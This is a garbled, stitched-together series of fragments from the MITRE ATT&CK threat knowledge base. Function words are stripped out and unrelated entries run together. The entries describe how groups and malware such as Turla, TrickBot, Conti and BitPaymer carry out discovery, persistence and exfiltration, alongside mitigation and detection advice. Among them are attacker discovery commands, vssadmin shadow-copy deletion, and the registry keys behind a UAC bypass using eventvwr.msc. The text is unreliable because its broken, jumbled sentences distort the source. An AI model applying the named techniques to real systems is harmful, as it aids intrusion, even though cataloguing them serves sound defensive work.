Dec 2018)(Citation: Trend Micro Muddy Water March 2021) [Turla](https://attack.mitre.org/groups/G0010) surveys check-in discover running processes <code>tasklist /v</code> command.(Citation: Kaspersky Turla) [Turla](https://attack.mitre.org/groups/G0010) RPC backdoors enumerated processes specific ports named pipes.(Citation: ESET Turla PowerShell 2019) [Dridex](https://attack.mitre.org/software/S0384) collected OS architecture system.(Citation: Checkpoint Dridex Jan 2021) [RATANKBA](https://attack.mitre.org/software/S0241) runs <code>net view /domain</code> <code>net view</code> commands.(Citation: RATANKBA) [KONNI](https://attack.mitre.org/software/S0356) custom base64 key encode stolen data exfiltration.(Citation: Medium KONNI Jan 2020) [TrickBot](https://attack.mitre.org/software/S0266) <code>printf</code> file I/O loops delay process execution API hammering.(Citation: Joe Trickbot) [HEXANE](https://attack.mitre.org/groups/G1001) PowerShell-based tools scripts discovery collection compromised hosts.(Citation: SecureWorks August 2019)(Citation: Kaspersky APT Trends Q1 April 2021)(Citation: Kaspersky Lyceum October 2021) Prevent users installing Python required. [Tomiris](https://attack.mitre.org/software/S0671) download files execute victim's system.(Citation: Kaspersky Tomiris Sep 2021) scans performed identify unauthorized archival utilities. [Stuxnet](https://attack.mitre.org/software/S0603) enumerates running processes variety security products.(Citation: Symantec W.32 Stuxnet Dossier) encryption layer security sensitive email. Encryption public key cryptography requires adversary private certificate encryption key decrypt messages. [Lizar](https://attack.mitre.org/software/S0681) execute files address space process.(Citation: BiZone Lizar 2021)  [Grandoreiro](https://attack.mitre.org/software/S0531) capture clipboard data compromised host.(Citation: IBM Grandoreiro April 2020) [HARDRAIN](https://attack.mitre.org/software/S0246) FakeTLS communicate C2 server.(Citation: US-CERT HARDRAIN March 2018) [APT33](https://attack.mitre.org/groups/G0064) attempted WMI event subscriptions establish persistence compromised hosts.(Citation: Holmium June 2020) [NOKKI](https://attack.mitre.org/software/S0353) collect username victim’s machine.(Citation: Unit 42 NOKKI Sept 2018) [SPACESHIP](https://attack.mitre.org/software/S0035) identifies files extensions copies directory user's profile.(Citation: FireEye APT30) [Conti](https://attack.mitre.org/software/S0575) delete Windows Volume Shadow Copies <code>vssadmin</code>.(Citation: CarbonBlack Conti July 2020) [Forfiles](https://attack.mitre.org/software/S0193) locate types files/directories system.(ex: locate files specific extension, name, age)(Citation: Überwachung APT28 Forfiles June 2015) [SMOKEDHAM](https://attack.mitre.org/software/S0649) exfiltrated data C2 server.(Citation: FireEye SMOKEDHAM June 2021) [menuPass](https://attack.mitre.org/groups/G0045) leveraged vulnerabilities Pulse Secure VPNs hijack sessions.(Citation: Securelist APT10 March 2021) [TA505](https://attack.mitre.org/groups/G0092) malware gather credentials Internet Explorer.(Citation: Proofpoint TA505 Sep 2017) [Aquatic Panda](https://attack.mitre.org/groups/G0143) acquired [Cobalt Strike](https://attack.mitre.org/software/S0154) operations.(Citation: CrowdStrike AQUATIC PANDA December 2021) Monitor extracted list setting  [njRAT](https://attack.mitre.org/software/S0385) capable logging keystrokes.(Citation: Fidelis njRAT June 2013)(Citation: Trend Micro njRAT 2018)(Citation: Citizen Lab Group5) [LoudMiner](https://attack.mitre.org/software/S0451) monitored CPU usage.(Citation: ESET LoudMiner June 2019)	 [Bisonal](https://attack.mitre.org/software/S0268) encoded binary data Base64 ASCII.(Citation: Kaspersky CactusPete Aug 2020)(Citation: Talos Bisonal Mar 2020)  Monitor newly constructed network connections received untrusted hosts.  Monitor files accessed existing, legitimate external service exfiltrate data primary command control channel. [Remsec](https://attack.mitre.org/software/S0125) list users.(Citation: Kaspersky ProjectSauron Technical Analysis) Monitor executed commands arguments attempt domain-level permission settings. [OSX_OCEANLOTUS.D](https://attack.mitre.org/software/S0352) disguised app bundle adding special characters filename icon legitimate Word documents.(Citation: Trend Micro MacOS Backdoor November 2020) [Ember Bear](https://attack.mitre.org/groups/G1003) JavaScript execute malicious code victim's machine.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [Crimson](https://attack.mitre.org/software/S0115) spread systems infecting removable media.(Citation: Kaspersky Transparent Tribe August 2020) Enable Hardened Runtime capability developing applications. include <code>com.apple.security.get-task-allow</code> entitlement set variation true.  Ensure proper permissions set Registry hives prevent users modifying logon scripts lead persistence. Monitor executed commands arguments configuration boot settings, <code>bcdedit.exe</code> <code>bootcfg.exe</code>.(Citation: bcdedit 2021)(Citation: Bootcfg)(Citation: Sophos Snatch Ransomware 2019) [FIN7](https://attack.mitre.org/groups/G0046) mshta.exe execute VBScript execute malicious code victim systems.(Citation: FireEye FIN7 April 2017) [Elise](https://attack.mitre.org/software/S0081) creates file <code>AppData\Local\Microsoft\Windows\Explorer</code> stores harvested data file.(Citation: Accenture Dragonfish Jan 2018) [Operation Sharpshooter](https://attack.mitre.org/campaigns/C0013), threat actors leveraged embedded shellcode inject downloader memory Word.(Citation: Threatpost Op Sharpshooter Data March 2019)     Preventing users deleting writing files adversaries maliciously altering <code>~/.bash_history</code> <code>ConsoleHost_history.txt</code> files. technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [REvil](https://attack.mitre.org/software/S0496) WMI monitor kill specific processes listed configuration file.(Citation: Secureworks GandCrab REvil September 2019)(Citation: IB Ransomware 2020) [CARROTBAT](https://attack.mitre.org/software/S0462) ability download execute remote file [certutil](https://attack.mitre.org/software/S0160).(Citation: Unit 42 CARROTBAT November 2018) Monitor newly executed processes attempt listing software software versions installed cloud environment. [SharpStage](https://attack.mitre.org/software/S0546) checked settings Arabic configured language.(Citation: BleepingComputer Molerats Dec 2020) Limit communications container service local Unix sockets remote access SSH. Require secure port access communicate APIs TLS disabling unauthenticated access Docker API, Kubernetes API Server, container orchestration applications.(Citation: Docker Daemon Socket Protect)(Citation: Kubernetes API Control Access) [InvisiMole](https://attack.mitre.org/software/S0260) avoids analysis encrypting strings, internal files, configuration data custom executable format.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) [APT28](https://attack.mitre.org/groups/G0007) deployed bootkit [Downdelph](https://attack.mitre.org/software/S0134) ensure persistence victim. bootkit shares code variants [BlackEnergy](https://attack.mitre.org/software/S0089).(Citation: ESET Sednit 3) Restrict read/write access system-level process files select privileged users legitimate manage services. [Cryptoistic](https://attack.mitre.org/software/S0498) scan directory identify files deletion.(Citation: SentinelOne Lazarus macOS July 2020) [WarzoneRAT](https://attack.mitre.org/software/S0670) variety API calls compromised host.(Citation: Uptycs Warzone UAC Bypass November 2020) [SHOTPUT](https://attack.mitre.org/software/S0063) command list servers domain, locate domain controllers domain.(Citation: Palo Alto CVE-2015-3113 July 2015) [Nebulae](https://attack.mitre.org/software/S0630) create service establish persistence.(Citation: Bitdefender Naikon April 2021) Limit access remote services centrally managed concentrators VPNs managed remote access systems. [Egregor](https://attack.mitre.org/software/S0554) DLL side-loading execute payload.(Citation: Cyble Egregor Oct 2020)  [Sidewinder](https://attack.mitre.org/groups/G0121) malware collect network interfaces, including MAC address.(Citation: ATT Sidewinder January 2021) Monitor newly executed processes disable Windows event logging limit data leveraged detections audits. [APT41](https://attack.mitre.org/groups/G0096) deployed Monero cryptocurrency mining tool victim’s environment.(Citation: FireEye APT41 Aug 2019) [ShimRat](https://attack.mitre.org/software/S0444) installed shim databases <code>AppPatch</code> folder.(Citation: FOX-IT 2016 Mofang) [Flagpro](https://attack.mitre.org/software/S0696) exfiltrated data C2 server.(Citation: NTT Security Flagpro December 2021)  detecting adversaries accessing files difficult knowing exist place, detect adversary credentials obtained. Monitor executed commands arguments executing processes suspicious regular expressions searching password (for example: password, pwd, login, secure, credentials). [Valid Accounts](https://attack.mitre.org/techniques/T1078) information. [APT32](https://attack.mitre.org/groups/G0050) hosted malicious payloads Dropbox, Amazon S3, Google Drive targeting.(Citation: Volexity Ocean Lotus November 2020) [BITSAdmin](https://attack.mitre.org/software/S0190) create [BITS Jobs](https://attack.mitre.org/techniques/T1197) upload download files.(Citation: BITSAdmin) [FinFisher](https://attack.mitre.org/software/S0182) creates Windows service malicious executable persistence.(Citation: FinFisher Citation)(Citation: FinFisher March 2018) [HAWKBALL](https://attack.mitre.org/software/S0391) encrypted data XOR sending C2 channel.(Citation: FireEye HAWKBALL Jun 2019) [AppleSeed](https://attack.mitre.org/software/S0622) exfiltrate files C2 channel.(Citation: Malwarebytes Kimsuky June 2021) [TURNEDUP](https://attack.mitre.org/software/S0199) capable gathering information.(Citation: FireEye APT33 Sept 2017) [SDBbot](https://attack.mitre.org/software/S0461) ability identify user compromised host.(Citation: Proofpoint TA505 October 2019) [LazyScripter](https://attack.mitre.org/groups/G0140) PowerShell scripts execute malicious code.(Citation: MalwareBytes LazyScripter Feb 2021) Monitor newly executed processes abuse AppleScript execution. Scripts perform actions effects generate events, depending types monitoring used. Actions network [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), scriptable post-compromise behaviors indicators detection leading source script. [Turla](https://attack.mitre.org/groups/G0010) surveys check-in discover network configuration details <code>arp -a</code>, <code>nbtstat -n</code>, <code>net config</code>, <code>ipconfig /all</code>, <code>route</code> commands, [NBTscan](https://attack.mitre.org/software/S0590).(Citation: Kaspersky Turla)(Citation: Symantec Waterbug Jun 2019)(Citation: ESET ComRAT 2020) [Turla](https://attack.mitre.org/groups/G0010) RPC backdoors retrieved registered RPC interface process memory.(Citation: ESET Turla PowerShell 2019) Prevent administrator accounts enumerated application elevating UAC lead disclosure account names. Registry key located <code>HKLM\ SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\CredUI\EnumerateAdministrators</code>. disabled GPO: Configuration > [Policies] > Administrative Templates > Windows Components > Credential User Interface: Enumerate administrator accounts elevation.(Citation: UCF STIG Elevation Account Enumeration) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors WMI queries check security applications running determine operating version.(Citation: Talos Frankenstein June 2019) [Nomadic Octopus](https://attack.mitre.org/groups/G0133) attempted lure victims clicking malicious attachments spearphishing emails.(Citation: Securelist Octopus Oct 2018)(Citation: ESET Nomadic Octopus 2018) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) [at](https://attack.mitre.org/software/S0110) register scheduled task execute malware lateral movement.(Citation: Secureworks BRONZE BUTLER Oct 2017) [SeaDuke](https://attack.mitre.org/software/S0053) HTTPS C2.(Citation: F-Secure Dukes) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). Monitor anomalous Kerberos activity, malformed blank fields Windows logon/logoff events (Event 4624, 4634, 4672). Correlate security systems login user KRBTGT account password hash forges Kerberos ticket-granting tickets).  restrict access unneeded VB components.(Citation: Disable VBA Jan 2020) [Gorgon Group](https://attack.mitre.org/groups/G0078) malware deactivate security mechanisms Office editing values <code>HKCU\Software\Microsoft\Office\</code>.(Citation: Unit 42 Gorgon Aug 2018) (Citation: Dragos Crashoverride 2018)(Citation: Dragos Crashoverride 2017)(Citation: ESET Industroyer)(Citation: Secureworks IRON VIKING) [QuasarRAT](https://attack.mitre.org/software/S0262) passwords common FTP clients.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018) [Dtrack](https://attack.mitre.org/software/S0567) collect host's IP addresses <code>ipconfig</code> command.(Citation: Securelist Dtrack)(Citation: CyberBit Dtrack) [Sandworm Team](https://attack.mitre.org/groups/G0034) researched software code enable supply-chain operations, notably 2017 [NotPetya](https://attack.mitre.org/software/S0368) attack. [Sandworm Team](https://attack.mitre.org/groups/G0034) collected list computers specific software targeting efforts.(Citation: District Court Indictment GRU Unit 74455 October 2020) [UNC2452](https://attack.mitre.org/groups/G0118) dynamic DNS resolution construct resolve randomly-generated subdomains C2.(Citation: Volexity SolarWinds) third-party applications logs collected correlated data environment. Ensure third-party application logs on-boarded enterprise logging logs regularly reviewed. Audit software deployment logs suspicious unauthorized activity. typically push software clients suddenly task admin function suspicious. Monitor account login activity applications detect suspicious/abnormal usage.
Perform application deployment regular times irregular deployment activity stands out. [Volgmer](https://attack.mitre.org/software/S0180) execute commands victim's machine.(Citation: US-CERT Volgmer Nov 2017)(Citation: US-CERT Volgmer 2 Nov 2017) (Citation: NICKEL December 2021) [Peirates](https://attack.mitre.org/software/S0683) list AWS S3 buckets.(Citation: Peirates GitHub) [TrickBot](https://attack.mitre.org/software/S0266) vncDll module remote control victim machine.(Citation: ESET Trickbot Oct 2020)(Citation: Bitdefender Trickbot March 2020) reuse local administrator account passwords systems. Ensure password complexity uniqueness passwords cracked guessed. [FlawedAmmyy](https://attack.mitre.org/software/S0381) transfer files C2.(Citation: Korean FSI TA505 2020) [ADVSTORESHELL](https://attack.mitre.org/software/S0045) enumerate registry keys.(Citation: ESET Sednit 2)(Citation: Bitdefender APT28 Dec 2015) [SILENTTRINITY](https://attack.mitre.org/software/S0692) transfer files infected host C2 server.(Citation: GitHub SILENTTRINITY Modules July 2019) [Kerrdown](https://attack.mitre.org/software/S0585) download specific payloads compromised host based OS architecture.(Citation: Unit 42 KerrDown February 2019) [PsExec](https://attack.mitre.org/software/S0029) download upload file network share.(Citation: PsExec Russinovich) (Citation: DFIR Report APT35 ProxyShell March 2022) [Sowbug](https://attack.mitre.org/groups/G0054) command intrusions.(Citation: Symantec Sowbug Nov 2017) (Citation: Novetta Blockbuster Loaders) Monitor analyze traffic patterns packet inspection protocol(s), leveraging SSL/TLS inspection encrypted traffic, follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Felismus](https://attack.mitre.org/software/S0171) collects information, including hostname OS version, sends C2 server.(Citation: Forcepoint Felismus Mar 2017) [Pupy](https://attack.mitre.org/software/S0192) perform pass-the-ticket.(Citation: GitHub Pupy) [Emotet](https://attack.mitre.org/software/S0367) obfuscated macros malicious documents hide URLs hosting malware,  CMD.exe arguments, PowerShell scripts. (Citation: Talos Emotet Jan 2019)(Citation: Trend Micro Emotet Jan 2019)(Citation: Picus Emotet Dec 2018)(Citation: ESET Emotet Dec 2018) [StrongPity](https://attack.mitre.org/software/S0491) created services modified existing services persistence.(Citation: Talos Promethium June 2020) [MuddyWater](https://attack.mitre.org/groups/G0069) malware list running processes system.(Citation: Securelist MuddyWater Oct 2018)(Citation: ClearSky MuddyWater June 2019) Restrict administrator accounts individuals possible, privilege principles, abused remotely boot machine safe mode.(Citation: CyberArk Labs Safe Mode 2016) 
Azure creates log entries devices enrolled, monitored unexpected device registrations.(Citation: AADInternals - BPRT) Additionally, joined devices viewed Azure portal.(Citation: Manage Device Identities) [Crimson](https://attack.mitre.org/software/S0115) identify geographical location victim host.(Citation: Kaspersky Transparent Tribe August 2020)	  Regularly check installed IIS components verify integrity server identify unexpected made. [Revenge RAT](https://attack.mitre.org/software/S0379) mshta.exe malicious scripts system.(Citation: Cofense RevengeRAT Feb 2019) Common tools detecting Linux rootkits include: rkhunter (Citation: SourceForge rkhunter), chrootkit (Citation: Chkrootkit Main), rootkits designed evade detection tools. Modify Registry settings (directly Dcomcnfg.exe) <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\AppID\\{AppID_GUID}</code> process-wide security individual applications.(Citation: Process Wide Keys)

Modify Registry settings (directly Dcomcnfg.exe) <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Ole</code> system-wide security defaults applications set process-wide security.(Citation: Wide Keys) (Citation: ACL) Limit privileges user accounts remediate Privilege Escalation vectors authorized administrators create scheduled tasks remote systems.  [Ryuk](https://attack.mitre.org/software/S0446) Wake-on-Lan power systems lateral movement.(Citation: Bleeping - Ryuk WoL) [SideTwist](https://attack.mitre.org/software/S0610) ability upload files compromised host.(Citation: Check APT34 April 2021) [TrickBot](https://attack.mitre.org/software/S0266) macros Excel documents download deploy malware user’s machine.(Citation: TrendMicro Trickbot Feb 2019) [zwShell](https://attack.mitre.org/software/S0350) modify Registry.(Citation: McAfee Night Dragon) [Andariel](https://attack.mitre.org/groups/G0138) inserted malicious script compromised websites collect potential victim browser type, language, Flash Player version, data.(Citation: TrendMicro Andariel Tactics July 2018) [LoudMiner](https://attack.mitre.org/software/S0451) QEMU VirtualBox Tiny Core Linux virtual machine, runs XMRig connections C2 server updates.(Citation: ESET LoudMiner June 2019) [Sibot](https://attack.mitre.org/software/S0589) delete server response received.(Citation: MSTIC NOBELIUM Mar 2021) [PolyglotDuke](https://attack.mitre.org/software/S0518) Twitter, Reddit, Imgur websites C2 URL.(Citation: ESET Dukes October 2019) [Sandworm Team](https://attack.mitre.org/groups/G0034) defaced 15,000 websites belonging Georgian government, non-government, private sector organizations 2019.(Citation: District Court Indictment GRU Unit 74455 October 2020)(Citation: NCSC Olympic Attacks October 2020) [Green Lambert](https://attack.mitre.org/software/S0690) collect data compromised host.(Citation: Objective Green Lambert OSX Oct 2021) [InvisiMole](https://attack.mitre.org/software/S0260) record sound input audio devices.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) [BLACKCOFFEE](https://attack.mitre.org/software/S0069) capability delete files.(Citation: FireEye APT17) [PyDCrypt](https://attack.mitre.org/software/S1032) compiled encrypted PyInstaller, --key flag build phase.(Citation: Checkpoint MosesStaff Nov 2021) [PcShare](https://attack.mitre.org/software/S1050) search registry files compromised host.(Citation: Bitdefender FunnyDream Campaign November 2020) [admin@338](https://attack.mitre.org/groups/G0018) actors command exploitation machine [LOWBALL](https://attack.mitre.org/software/S0042) malware display network connections: <code>netstat -ano >> %temp%\download</code>(Citation: FireEye admin@338) Minimize permissions access service accounts limit impact exploitation. [ABK](https://attack.mitre.org/software/S0469) ability download files C2.(Citation: Trend Micro Tick November 2019) domain administrator accounts day-to-day operations expose potential adversaries unprivileged systems. [Sibot](https://attack.mitre.org/software/S0589) legitimate compromised download DLLs victim's machine.(Citation: MSTIC NOBELIUM Mar 2021) [menuPass](https://attack.mitre.org/groups/G0045) staged data remote MSP systems victim networks prior exfiltration.(Citation: PWC Cloud Hopper April 2017)(Citation: Symantec Cicada November 2020) [IndigoZebra](https://attack.mitre.org/groups/G0136) created Dropbox accounts operations.(Citation: HackerNews IndigoZebra July 2021)(Citation: Checkpoint IndigoZebra July 2021) [SUGARDUMP](https://attack.mitre.org/software/S1042) collected browser bookmark history information.(Citation: Mandiant UNC3890 Aug 2022) [Bumblebee](https://attack.mitre.org/software/S1039) delivered password-protected zipped ISO files control-flow-flattening obfuscate flow functions.(Citation: Proofpoint Bumblebee April 2022)(Citation: Cybereason Bumblebee August 2022)(Citation: Medium Ali Salem Bumblebee April 2022) [Hildegard](https://attack.mitre.org/software/S0601) established tmate sessions C2 communications.(Citation: Unit 42 Hildegard Malware) [CORALDECK](https://attack.mitre.org/software/S0212) searches files.(Citation: FireEye APT37 Feb 2018) [NanoCore](https://attack.mitre.org/software/S0336) VBS files.(Citation: Cofense NanoCore Mar 2018) [Crimson](https://attack.mitre.org/software/S0115) command retrieve files C2 server.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) [njRAT](https://attack.mitre.org/software/S0385) C2 communications.(Citation: Trend Micro njRAT 2018) [Revenge RAT](https://attack.mitre.org/software/S0379) creates Registry key <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> survive reboot.(Citation: Cylance Shaheen Nov 2018) [RainyDay](https://attack.mitre.org/software/S0629) proxy tools including boost_proxy_client reverse proxy functionality.(Citation: Bitdefender Naikon April 2021) [Gelsemium](https://attack.mitre.org/software/S0666) multiple domains protocols C2.(Citation: ESET Gelsemium June 2021) [Ramsay](https://attack.mitre.org/software/S0458) [UACMe](https://attack.mitre.org/software/S0116) privilege escalation.(Citation: Eset Ramsay 2020)(Citation: Antiy CERT Ramsay April 2020)	 [OilRig](https://attack.mitre.org/groups/G0049) spearphising emails malicious attachments potential victims compromised spoofed email accounts.(Citation: Unit 42 OopsIE! Feb 2018)(Citation: Unit 42 QUADAGENT July 2018)(Citation: Crowdstrike Helix Kitten Nov 2018) [Ember Bear](https://attack.mitre.org/groups/G1003) Discord's content delivery network (CDN) deliver malware malicious scripts compromised host.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [MobileOrder](https://attack.mitre.org/software/S0079) command upload C2 server victim mobile device information, including IMEI, IMSI, SIM card serial number, phone number, Android version, information.(Citation: Scarlet Mimic Jan 2016) [Emotet](https://attack.mitre.org/software/S0367) observed dropping password grabber modules including [Mimikatz](https://attack.mitre.org/software/S0002). (Citation: Trend Micro Emotet Jan 2019) (Citation: Trend Micro Iron Tiger April 2021) [Cardinal RAT](https://attack.mitre.org/software/S0348) reverse proxy.(Citation: PaloAlto CardinalRat Apr 2017) Restrict write access logon scripts specific administrators. [Cobalt Group](https://attack.mitre.org/groups/G0080) JavaScript backdoor capable launching cmd.exe execute commands.(Citation: Morphisec Cobalt Gang Oct 2018) exploit toolkit Threadkit launches .bat files.(Citation: Talos Cobalt July 2018)(Citation: PTSecurity Cobalt Aug 2017)(Citation: IB Cobalt Aug 2017)(Citation: Morphisec Cobalt Gang Oct 2018)(Citation: Unit 42 Cobalt Gang Oct 2018)(Citation: TrendMicro Cobalt Nov 2017) [Astaroth](https://attack.mitre.org/software/S0373) WMIC execute payloads. (Citation: Cofense Astaroth Sept 2018) [ISMInjector](https://attack.mitre.org/software/S0189) obfuscated off-the-shelf SmartAssembly .NET obfuscator created red-gate.com.(Citation: OilRig Delivery Oct 2017) (Citation: Unit42 Emissary Panda 2019)(Citation: Securelist LuckyMouse June 2018)(Citation: Hacker News LuckyMouse June 2018)(Citation: Trend Micro DRBControl February 2020)(Citation: Trend Micro Iron Tiger April 2021) [MacMa](https://attack.mitre.org/software/S1016) TCP port 5633 C2 Communication.(Citation: ESET DazzleSpy Jan 2022) [APT33](https://attack.mitre.org/groups/G0064) downloaded additional files programs C2 server.(Citation: Symantec Elfin Mar 2019)(Citation: Holmium June 2020)	
 [Molerats](https://attack.mitre.org/groups/G0021) public tool BrowserPasswordDump10 dump passwords saved browsers victims.(Citation: DustySky) Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. Monitor contextual data scheduled job, include name, timing, command(s), etc. [GALLIUM](https://attack.mitre.org/groups/G0093) modified version [HTRAN](https://attack.mitre.org/software/S0040) redirect connections networks.(Citation: Cybereason Soft Cell June 2019) [CostaBricks](https://attack.mitre.org/software/S0614) inject payload memory compromised host.(Citation: BlackBerry CostaRicto November 2020) [Ferocious](https://attack.mitre.org/software/S0679) PowerShell scripts execution.(Citation: Kaspersky WIRTE November 2021) [ChChes](https://attack.mitre.org/software/S0144) collects victim hostname, window resolution, Windows version.(Citation: Palo Alto menuPass Feb 2017)(Citation: PWC Cloud Hopper Technical Annex April 2017) [NanoCore](https://attack.mitre.org/software/S0336) perform keylogging victim’s machine.(Citation: PaloAlto NanoCore Feb 2016) [Grandoreiro](https://attack.mitre.org/software/S0531) malicious browser extensions steal cookies user information.(Citation: IBM Grandoreiro April 2020) Enable account restrictions prevent login attempts, subsequent 2FA/MFA service requests, initiated suspicious locations source login attempts match location 2FA/MFA smart device. [FlawedGrace](https://attack.mitre.org/software/S0383) custom binary protocol C2 communications.(Citation: Proofpoint TA505 Jan 2019) Network intrusion detection prevention systems network signatures identify traffic specific adversary command control infrastructure malware mitigate activity network level. [FoggyWeb](https://attack.mitre.org/software/S0661) disguised Visual Studio file `Windows.Data.TimeZones.zh-PH.pri` evade detection. Also, [FoggyWeb](https://attack.mitre.org/software/S0661)'s loader mimic genuine `dll` file carries import functions legitimate Windows `version.dll` file.(Citation: MSTIC FoggyWeb September 2021) [Flagpro](https://attack.mitre.org/software/S0696) <code>whoami</code> command system.(Citation: NTT Security Flagpro December 2021) [Pony](https://attack.mitre.org/software/S0453) attempted lure targets clicking links spoofed emails legitimate banks.(Citation: Malwarebytes Pony April 2016)	 [P.A.S. Webshell](https://attack.mitre.org/software/S0598) scan networks ports listening services.(Citation: ANSSI Sandworm January 2021) [VERMIN](https://attack.mitre.org/software/S0257) obfuscated obfuscation tool called ConfuserEx.(Citation: Unit 42 VERMIN Jan 2018) [Neoichor](https://attack.mitre.org/software/S0691) upload files victim's machine.(Citation: NICKEL December 2021) [Suckfly](https://attack.mitre.org/groups/G0039) signed credential-dumping tool victim account credentials.(Citation: Symantec Suckfly 2016) [Remsec](https://attack.mitre.org/software/S0125) capable ICMP, TCP, UDP C2.(Citation: Symantec Remsec IOCs)(Citation: Kaspersky ProjectSauron Report) [Dragonfly](https://attack.mitre.org/groups/G0035) created accounts disguised legitimate backup service accounts email administration account.(Citation: US-CERT TA18-074A) Detection Network DoS achieved traffic volume sufficient impact availability service, response time typically requires aggressive monitoring responsiveness services upstream network service provider. Monitor logging, messaging, artifacts highlighting health host sensors (ex: metrics, errors, exceptions logging applications) [DnsSystem](https://attack.mitre.org/software/S1021) lured victims macro-enabled Word documents execution.(Citation: Zscaler Lyceum DnsSystem June 2022) [ADVSTORESHELL](https://attack.mitre.org/software/S0045) list connected devices.(Citation: ESET Sednit 2) [Zebrocy](https://attack.mitre.org/software/S0251) performs persistence logon script adding Registry key <code>HKCU\Environment\UserInitMprLogonScript</code>.(Citation: ESET Zebrocy Nov 2018) [Micropsia](https://attack.mitre.org/software/S0339) HTTPS C2 network communications.(Citation: Talos Micropsia June 2017)(Citation: Radware Micropsia July 2018) [REvil](https://attack.mitre.org/software/S0496) decode encrypted strings enable execution commands payloads.(Citation: Data Sodinokibi June 2019)(Citation: Kaspersky Sodin July 2019)(Citation: Cylance Sodinokibi July 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: Intel 471 REvil March 2020)(Citation: Secureworks REvil September 2019) Follow practices network firewall configurations ports traffic enter exit network.(Citation: TechNet Firewall Design) [Cobalt Strike](https://attack.mitre.org/software/S0154) query shared drives local system.(Citation: Cobalt Strike TTPs Dec 2017) [Donut](https://attack.mitre.org/software/S0695) code modules API functions load inject code.(Citation: Donut Github)	 [NETWIRE](https://attack.mitre.org/software/S0198) masqueraded legitimate software including TeamViewer macOS Finder.(Citation: Red Canary NETWIRE January 2020) (Citation: CrowdStrike PIONEER KITTEN August 2020) [Axiom](https://attack.mitre.org/groups/G0001) VPS hosting providers targeting intended victims.(Citation: Novetta-Axiom) [Misdat](https://attack.mitre.org/software/S0083) network traffic Base64-encoded plaintext.(Citation: Cylance Dust Storm) [Drovorub](https://attack.mitre.org/software/S0502) exfiltrate files C2 infrastructure.(Citation: NSA/FBI Drovorub August 2020) Monitor authentication logs application login failures [Valid Accounts](https://attack.mitre.org/techniques/T1078). difficult detect hashes cracked, scope target network. focusing efforts detecting adversary behavior acquire credential materials, [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) [Kerberoasting](https://attack.mitre.org/techniques/T1558/003). [Socksbot](https://attack.mitre.org/software/S0273) start SOCKS proxy threads.(Citation: TrendMicro Patchwork Dec 2017) Monitor executed commands arguments scripts PubPrn.vbs proxy execution malicious files. [InvisiMole](https://attack.mitre.org/software/S0260) spread network BlueKeep (CVE-2019-0708) EternalBlue (CVE-2017-0144) vulnerabilities RDP SMB respectively.(Citation: ESET InvisiMole June 2020) [PLATINUM](https://attack.mitre.org/groups/G0068) keyloggers capable dumping credentials.(Citation: PLATINUM April 2016) Ensure proper permissions set Registry hives prevent users modifying SIP trust provider components. Components hijacked suitable functions disk malicious modifications Registry prevented. Alterations service binary path service startup type changed disabled suspicious. [Proton](https://attack.mitre.org/software/S0279) keylogger capture keystrokes.(Citation: objsee mac malware 2017) Monitor newly constructed processes command-lines invoking cmd pcalua.exe, winrs.exe, cscript/wscript.exe, hh.exe, bash.exe) [Bankshot](https://attack.mitre.org/software/S0239) uploads files secondary payloads victim's machine.(Citation: US-CERT Bankshot Dec 2017) [HAFNIUM](https://attack.mitre.org/groups/G0125) Exchange Power module <code>Set-OabVirtualDirectoryPowerShell</code> export mailbox data.(Citation: HAFNIUM March 2020)(Citation: Volexity Exchange Marauder March 2021) [Clop](https://attack.mitre.org/software/S0611) cmd.exe execute commands system.(Citation: Cybereason Clop Dec 2020)  [Ursnif](https://attack.mitre.org/software/S0386) [Reg](https://attack.mitre.org/software/S0075) query Registry installed programs.(Citation: TrendMicro Ursnif Mar 2015)(Citation: TrendMicro BKDR_URSNIF.SM) Monitor DLL/PE file events, creation binary files loading DLLs processes. DLLs recognized loaded process. Monitor started applications creating raw socket connections.(Citation: crowdstrike bpf socket filters) [Kimsuky](https://attack.mitre.org/groups/G0094) obfuscated binary strings including XOR encryption Base64 encoding.(Citation: ThreatConnect Kimsuky September 2020)(Citation: VirusBulletin Kimsuky October 2019) [Kimsuky](https://attack.mitre.org/groups/G0094) modified byte DLL implants targeting victims prevent recognition executable file format.(Citation: Talos Kimsuky Nov 2021) (Citation: FireEye APT30) periodic review <code>auditpol</code> settings Administrator accounts perform dynamic baselining SIEM(s) investigate potential malicious activity. ensure EventLog service threads properly running. [BitPaymer](https://attack.mitre.org/software/S0570) suppress UAC prompts setting <code>HKCU\Software\Classes\ms-settings\shell\open\command</code> registry key Windows <code>HKCU\Software\Classes\mscfile\shell\open\command</code> Windows 7 launching <code>eventvwr.msc</code> process, launches [BitPaymer](https://attack.mitre.org/software/S0570) elevated privileges.(Citation: Crowdstrike Indrik November 2018) Track deployment containers, newly built images. Monitor processes enumerate user accounts <code>net.exe</code> <code>net1.exe</code>, executed quick succession.(Citation: Elastic - Koadiac Detection EQL)
 
